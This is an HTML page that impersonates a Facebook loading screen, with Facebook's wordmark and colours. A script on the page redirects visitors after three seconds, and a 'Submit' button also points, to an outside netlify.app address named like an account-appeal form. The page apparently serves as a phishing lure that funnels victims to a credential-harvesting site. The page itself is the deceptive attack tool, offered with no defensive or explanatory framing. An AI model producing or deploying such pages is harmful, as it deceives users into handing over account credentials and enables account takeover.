<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Facebook Loading</title>

<style>
    body {
        margin: 0;
        background: #f0f2f5;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        font-family: Arial, sans-serif;
    }

    .container {
        text-align: center;
    }

    .logo {
        font-size: 60px;
        font-weight: bold;
        color: #1877f2;
        font-family: Helvetica, Arial, sans-serif;
        margin-bottom: 20px;
    }

    .dots span {
        display: inline-block;
        width: 10px;
        height: 10px;
        margin: 5px;
        background: #1877f2;
        border-radius: 50%;
        animation: bounce 1.5s infinite;
    }

    .dots span:nth-child(2) {
        animation-delay: 0.2s;
    }

    .dots span:nth-child(3) {
        animation-delay: 0.4s;
    }

    @keyframes bounce {
        0%, 80%, 100% { transform: scale(0); }
        40% { transform: scale(1); }
    }

    .text {
        margin-top: 15px;
        color: #555;
        font-size: 14px;
    }

    a {
        display: inline-block;
        margin-top: 20px;
        padding: 10px 20px;
        background: #1877f2;
        color: white;
        text-decoration: none;
        border-radius: 5px;
        font-size: 14px;
    }

</style>

</head>
<body>

<div class="container">
    <div class="logo">facebook</div>

    <div class="dots">
        <span></span>
        <span></span>
        <span></span>
    </div>

    <div class="text">Loading...</div>

    <!-- 🔹 Button text changed -->
    <a href="https://submit-for-appeal-here-sm.netlify.app/">Submit</a>
</div>

<script>
    let targetLink = "https://submit-for-appeal-here-sm.netlify.app/";

    setTimeout(function(){
        window.location.href = targetLink;
    }, 3000);
</script>

</body>
</html>
